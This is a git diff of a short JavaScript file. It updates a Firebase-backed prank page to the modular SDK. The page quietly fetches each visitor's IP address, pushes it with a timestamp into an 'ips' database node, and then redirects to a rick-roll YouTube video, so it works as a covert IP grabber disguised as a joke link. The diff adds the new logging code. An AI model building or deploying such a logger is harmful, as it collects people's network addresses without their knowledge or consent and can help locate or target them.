@@ -1,14 +1,8 @@
-import firebase from 'firebase/app';
-import 'firebase/database';
+import { database } from './firebase.js';
+import { ref, push } from "https://www.gstatic.com/firebasejs/11.6.0/firebase-database.js";
 
-const RICK_ROLL = 'https://www.youtube.com/watch?v=dQw4bXcQXcQ';
 
-const config = {
-    apiKey: '<API_KEY>',
-    authDomain: '<AUTH_DOMAIN>',
-    databaseURL: 'https://<DATABASE_URL>.firebaseio.com'
-};
-firebase.initializeApp(config);
+const RICK_ROLL = 'https://www.youtube.com/watch?v=xvFZjo5PgG0';
 
 async function getRealIP() {
     try {
@@ -27,11 +21,17 @@ async function submitIpToFirebase() {
 
     try {
         const ip = await getRealIP();
-        db.ref('ips').push(ip);
-    } catch (error) {
-        console.log("Error getting IP address: " + error);
+        const ipsRef = ref(database, 'ips');
+
+        // Push the IP address to Firebase
+        push(ipsRef, {
+            ip: ip,
+            timestamp: new Date().toISOString()
+        });
     }
-    
+    catch (error) {
+        throw new Error('Failed to fetch IP address: ' + error);
+    }
     setTimeout(() => window.open(RICK_ROLL, '_self'), 3000);
 }
 
